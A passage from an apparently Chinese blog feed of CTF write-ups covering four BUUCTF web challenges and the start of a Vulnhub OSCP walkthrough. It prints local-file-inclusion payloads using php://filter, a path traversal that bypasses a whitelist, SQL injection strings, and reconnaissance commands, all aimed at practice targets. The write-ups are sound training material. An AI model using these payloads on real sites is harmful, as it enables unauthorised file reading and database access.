        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刷题网址：<a href="https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Include">https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Include</a></p><hr><p>首先打开网页，提示<code>tips</code>点击他，根据题目提示很难不想到是文件包含，但是提示是能找到外面的flag吗，如下图。</p><p><img src="/images/wordimage/2022/0513/jike.png"></p><p>这里我猜想的是否在上上一个目录，<code>../</code>上一个目录，但是无论我输多少都不行。</p><p><img src="/images/wordimage/2022/0513/errflag.png"></p><p>所以这里我转换思路尝试去读取，index.php，发现也不行，所以这里我猜想的是，是不是<code>php伪协议</code>，关于php伪协议的东西可以自行百度查找，这里我使用<code>php://filter</code>读取文件，发现读取成功，这里我读取的是<code>index.php</code>，读取使用的payload如下，是把文件以base64的方式读取，然后我们拿去网址在线解密。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">payload: /?file=php://filter/read=convert.base64-encode/resource=index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解密代码如下，我们可以清晰的看见，如果file里面有这些<code>php://input</code>,<code>zip://</code>,<code>phar://</code>,<code>data:</code>就会直接退出程序，并且报错<code>hacker</code>。</p><p>这里没有过滤<code>php://filter</code>所以我们能进来。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php://input"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"zip://"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phar://"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="?file=flag.php">tips&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>既然是这样，我们在尝试读取一下<code>flag.php</code>试试，payload如下。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">payload: /?file=php://filter/read=convert.base64-encode/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后我们在拿去base64解密，flag就出来了，如下图。</p><p><img src="/images/wordimage/2022/0513/flag2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf-Web-[极客大挑战 2019]Havefun</title>
      <link href="/2022/056872a7f.html"/>
      <url>/2022/056872a7f.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刷题网址：<a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Havefun">https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Havefun</a></p><hr><p>首先打开题目，发现是一只猫猫，如下图</p><p><img src="/images/wordimage/2022/0513/cat.png"></p><p>二话不说直接看源代码，发现了东西，如下图。</p><p><img src="/images/wordimage/2022/0513/phpcode.png"></p><p>代码如下，<code>GET</code>传参了<code>cat</code>，判断传参<code>cat</code>是否等于<code>dog</code>，如果是那么就输出<code>Syc&#123;cat_cat_cat_cat&#125;</code>，非常简单的代码审计</p><p>payload: <code>/?cat=dog</code></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;!-- $cat&#x3D;$_GET[&#39;cat&#39;]; echo $cat; if($cat&#x3D;&#x3D;&#39;dog&#39;)&#123;     echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;; &#125; --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag就出来了，flag如下</p><p><img src="/images/wordimage/2022/0513/catflag.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf-Web-[HCTF 2018]WarmUp</title>
      <link href="/2022/055af74b9f.html"/>
      <url>/2022/055af74b9f.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刷题地址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p><hr><p>首先打开是一个笑脸，查看源代码，如下图发现了，一个文件</p><p><img src="/images/wordimage/2022/0512/source.png"></p><h2 id="一-代码分析"><a href="#一-代码分析" class="headerlink" title="一.代码分析"></a>一.代码分析</h2><p>发现是一堆代码，需要PHP代码审计，全部代码如下。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">1 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token number">2</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">3</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">emmm</span><span class="token number">4</span>    <span class="token punctuation">&#123;</span><span class="token number">5</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token number">6</span>        <span class="token punctuation">&#123;</span><span class="token number">7</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=></span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=></span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token number">8</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">9</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span><span class="token number">10</span>                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token number">11</span>           <span class="token punctuation">&#125;</span><span class="token number">12</span><span class="token number">13</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">14</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token number">15</span>            <span class="token punctuation">&#125;</span><span class="token number">16</span><span class="token number">17</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token number">18</span>                <span class="token variable">$page</span><span class="token punctuation">,</span><span class="token number">19</span>                <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">20</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span><span class="token number">21</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">22</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">23</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token number">24</span>            <span class="token punctuation">&#125;</span><span class="token number">25</span><span class="token number">26</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">27</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token number">28</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span><span class="token number">29</span>                <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">30</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span><span class="token number">31</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">32</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">33</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token number">34</span>            <span class="token punctuation">&#125;</span><span class="token number">35</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span><span class="token number">36</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token number">37</span>        <span class="token punctuation">&#125;</span><span class="token number">38</span>    <span class="token punctuation">&#125;</span><span class="token number">39</span><span class="token number">40</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token number">41</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token number">42</span>        <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">emmm</span><span class="token operator">::</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token number">43</span>    <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">44</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token number">45</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token number">46</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token number">47</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span><span class="token number">48</span>    <span class="token punctuation">&#125;</span>  <span class="token number">49</span>  <span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看到了关键字眼<code>hint.php</code>。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=></span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=></span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们访问这个文件查看，如下图，发现flag在<code>ffffllllaaaagggg</code>里面</p><p><img src="/images/wordimage/2022/0512/ffffflllllaaagggg.png"></p><p>首先先看40-48行的内容<code>! empty($_REQUEST[&#39;file&#39;]</code>的意思是传参<code>file</code>不能为空</p><p><code>is_string($_REQUEST[&#39;file&#39;]</code>的意思是传参必须要字符串</p><p><code>emmm::checkFile($_REQUEST[&#39;file&#39;]</code>这句话的意思是要经过checkFile函数的检查</p><p>如果都为真那么就执行<code>include $_REQUEST[&#39;file&#39;];</code>包含文件</p><p>如果为否那么就输出滑稽图片</p><p>由此可以总结</p><blockquote><p>1.file传参不能为空</p><p>2.file传参必须要字符串</p><p>3.需要经过checkFile函数的检测</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">40</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token number">41</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token number">42</span>        <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">emmm</span><span class="token operator">::</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token number">43</span>    <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">44</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token number">45</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token number">46</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token number">47</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span><span class="token number">48</span>    <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来来看看，函数代码为5-38行,首先来看第一个if语句<code>issset()</code>函数判断是否设置了<code>$page</code>，或者如果<code>$page</code>不是字符串就输出<code>you can&#39;t see it</code>然后返回为假。</p><p>第二个if语句判断的是<code>$page</code>是否在<code>$whitelist</code>里面，如果在那么就返回true。</p><p>然后17行-21行是截取<code>$page</code>?前面的东西<code>mb_substr()</code>函数是截取，<code>mb_strpos()</code>涵数是判断字符串首次出现的位置就是，截取<code>$page</code>0-?首次出现的位置的地方也就是截取?前面的东西</p><p>22-24行又判断<code>$page</code>是否在<code>$whitelist</code>里面如果有那么就返回true</p><p>26行对传参进行了一次url编码解码</p><p>27-31又进行了一次截取</p><p>32-34又进行了一次判断是否在<code>$whitelist</code>里面，如果有那么就返回true</p><p>总结来说</p><blockquote><p>1.第一个if判断是$是否设置了值或者是$page是否为字符串，如果不是返回false</p><p>2.第二个if判断的是$page是否在$whitelist列表里面如果在就返回true</p><p>3.第三个语句是截取$page问号前面的东西</p><p>4.第四个语句会对$page进行一次url编码的解码，加上浏览器就是两次解码</p><p>5.第五个语句还是截取$page问好前面的东西</p><p>6.最后一个语句判断$page是否在$whitelist里面</p></blockquote><p>如果上面四个if语句都没返回那么就返回false</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">emmm</span><span class="token number">4</span>    <span class="token punctuation">&#123;</span><span class="token number">5</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token number">6</span>        <span class="token punctuation">&#123;</span><span class="token number">7</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=></span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=></span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token number">8</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">9</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span><span class="token number">10</span>                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token number">11</span>           <span class="token punctuation">&#125;</span><span class="token number">12</span><span class="token number">13</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">14</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token number">15</span>            <span class="token punctuation">&#125;</span><span class="token number">16</span><span class="token number">17</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token number">18</span>                <span class="token variable">$page</span><span class="token punctuation">,</span><span class="token number">19</span>                <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">20</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span><span class="token number">21</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">22</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">23</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token number">24</span>            <span class="token punctuation">&#125;</span><span class="token number">25</span><span class="token number">26</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">27</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token number">28</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span><span class="token number">29</span>                <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">30</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span><span class="token number">31</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">32</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">33</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token number">34</span>            <span class="token punctuation">&#125;</span><span class="token number">35</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span><span class="token number">36</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token number">37</span>        <span class="token punctuation">&#125;</span><span class="token number">38</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以经过上面的判断，payload应该是如下,测试其实不需要两次编码都可以，因为<code>?</code>的解码还是<code>?</code>所以也可以直接<code>/source.php?file=source.php?../../../../../../../../../../ffffllllaaaagggg</code></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">/source.php?file=source.php%253f../../../../../../../../../../ffffllllaaaagggg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf-Web-[极客大挑战 2019]EasySQL</title>
      <link href="/2022/05b357abd1.html"/>
      <url>/2022/05b357abd1.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刷题网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p><hr><p>首先在网页测试输入<code>admin</code>,<code>admin</code>，如下图，发现是GET传输</p><p><img src="/images/wordimage/2022/0512/get.png"></p><p>然后在后面输入一个<code>&#39;</code>，之后发现报错，如下图。</p><p>payload是：<code>?username=admin&amp;password=admin&#39;</code></p><p><img src="/images/wordimage/2022/0512/baocuo.png"></p><p>payload是：<code>?username=admin&amp;password=admin&#39; order by 5%23</code></p><p>因为是GET传参，所以<code>#</code>编码之后是<code>%23</code>，如下图</p><p><img src="/images/wordimage/2022/0512/orderby.png"></p><p>经过测试，发现是有三个字段的，如下图</p><p>payload是：<code>?username=admin&amp;password=admin&#39; order by 3</code></p><p><img src="/images/wordimage/2022/0512/orderby3.png"></p><p>但是要查3个字段的时候发现flag直接出来了，如下图</p><p>payload是：<code>?username=admin&amp;password=admin&#39; union select 1,2,3%23</code></p><p><img src="/images/wordimage/2022/0512/flag.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-OSCP靶机实战-适合新手的靶场</title>
      <link href="/2022/05ad0d555d.html"/>
      <url>/2022/05ad0d555d.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个靶机适合新手，因为步骤很短很短</p><p>靶机下载地址：<a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/">https://www.vulnhub.com/entry/infosec-prep-oscp,508/</a></p><blockquote><p>KALI地址：192.168.241.108</p><p>靶机地址：192.168.241.170</p></blockquote><hr><h2 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>使用命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover -r <span class="token number">192.168</span>.241.108<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0510/net.png"></p><hr><h3 id="2-主机扫描"><a href="#2-主机扫描" class="headerlink" title="2.主机扫描"></a>2.主机扫描</h3><p>既然发现了主机，那么就需要进行信息收集，和扫描，这里使用Nmap工具，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -T4 -p- <span class="token number">192.168</span>.241.170<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，发现开放的端口有<code>20</code>,<code>80</code>,<code>33060</code></p><p><img src="/images/wordimage/2022/0510/nmap.png"></p><hr><h3 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h3><p>既然发现开放了80端口，开放了http服务肯定是，有目录，使用命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.241.170<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，发现扫描了很多东西，比如<code>wordpress</code>，和<code>robots.txt</code>目录</p><p><img src="/images/wordimage/2022/0510/dirb.png"></p><hr><h3 id="4-网页信息收集"><a href="#4-网页信息收集" class="headerlink" title="4.网页信息收集"></a>4.网页信息收集</h3><p>如下图，我们访问首页，发现任务目标，发现是需要获取<code>/root</code>目录下面的东西，然后指定用户是oscp</p><p><img src="/images/wordimage/2022/0510/inter.png"></p><p>并且得知，web目录是wordpress目录，然后我们上面目录扫描，发现了<code>robots.txt</code>，如下图访问，发现有一个目录是<code>/secert.txt</code>目录</p><p><img src="/images/wordimage/2022/0510/robots.png"></p><p>如下图访问这个目录，发现是一堆的编码，看后面两个<code>==</code>可以发现是<code>base64</code>编码。</p><p><img src="/images/wordimage/2022/0510/secert.png"></p><hr><h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二.漏洞利用"></a>二.漏洞利用</h2><p>上面我们发现了base64编码，我们拿去网上base64解密，解密结果如下。</p><p><img src="/images/wordimage/2022/0510/base64.png"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-----BEGIN OPENSSH PRIVATE 